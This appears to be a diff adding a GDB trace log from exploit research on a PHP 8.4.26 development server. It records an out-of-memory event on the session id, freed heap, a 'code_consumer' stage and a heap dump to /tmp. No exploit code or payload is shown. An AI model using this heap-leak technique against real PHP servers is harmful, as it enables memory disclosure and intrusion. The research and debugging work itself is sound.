@@ -1,0 +1,16 @@
+Breakpoint 1 at 0x25689e
+Breakpoint 2 at 0x615ee0
+Breakpoint 3 at 0x4bbb90
+[*] trace_code_leak.gdb loaded (STEP=0). Starting PHP...
+[Sat Oct 31 22:18:37 2026] PHP 8.4.26 Development Server (http://0.0.0.0:8080) started
+[Sat Oct 31 22:18:40 2026] 172.17.0.1:44024 Accepted
+[PHASE 1] OOM. PS(id)=0x7fd550876080, len=32
+[PHASE 2] Heap freed (code stage).
+[Sat Oct 31 22:18:40 2026] 172.17.0.1:44024 Closing
+[Sat Oct 31 22:18:43 2026] 172.17.0.1:54738 Accepted
+[PHASE 3] code_consumer done. len=16, val[0]=0x10
+[DUMP] /tmp/heap_code_1.bin: 8192 bytes at 0x7fd550875080
+[DUMP] metadata: /tmp/heap_code_1.txt
+[DUMP] Step 1 (code_leak) capture complete: After code_consumer (73 s-fields + 910 a-fields)
+[Sat Oct 31 22:18:43 2026] 172.17.0.1:54738 [200]: POST /test.php
+[Sat Oct 31 22:18:43 2026] 172.17.0.1:54738 Closing
